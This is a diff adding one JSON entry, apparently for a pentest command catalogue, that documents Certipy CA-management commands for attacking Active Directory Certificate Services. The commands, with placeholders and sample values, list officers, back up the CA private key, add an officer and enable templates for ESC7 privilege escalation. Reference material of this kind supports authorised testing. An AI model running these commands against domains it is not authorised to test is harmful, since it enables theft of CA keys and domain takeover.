@@ -1,0 +1,23 @@
+{
+  "id": "certipy-ca",
+  "name": "Certipy CA Management",
+  "command": "certipy ca -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca_name>' -list-officers",
+  "description": "Enumerate and manipulate the certificate authority itself: list officers (ESC7), backup the CA private key, add/remove officers and managers, list templates available on the CA. Required for ESC7 escalation chains.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["ldap", "rpc"],
+  "tags": ["certipy", "adcs", "esc7", "ca", "officer", "backup"],
+  "variations": [
+    { "label": "Backup CA Key", "requires": "password", "command": "certipy ca -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca_name>' -backup" },
+    { "label": "Add Officer (ESC7)", "requires": "password", "command": "certipy ca -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca_name>' -add-officer <new_officer>" },
+    { "label": "List Templates", "requires": "password", "command": "certipy ca -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca_name>' -list-templates" },
+    { "label": "Enable Template", "requires": "password", "command": "certipy ca -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca_name>' -enable-template '<template>'" }
+  ],
+  "references": [
+    { "title": "Certipy README", "url": "https://github.com/ly4k/Certipy" }
+  ],
+  "examples": [
+    "certipy ca -u 'jdoe@corp.local' -p 'Password123!' -dc-ip 10.10.10.10 -ca 'CORP-CA' -list-officers",
+    "certipy ca -u 'jdoe@corp.local' -p 'Password123!' -dc-ip 10.10.10.10 -ca 'CORP-CA' -enable-template 'SmartcardLogon'"
+  ]
+}
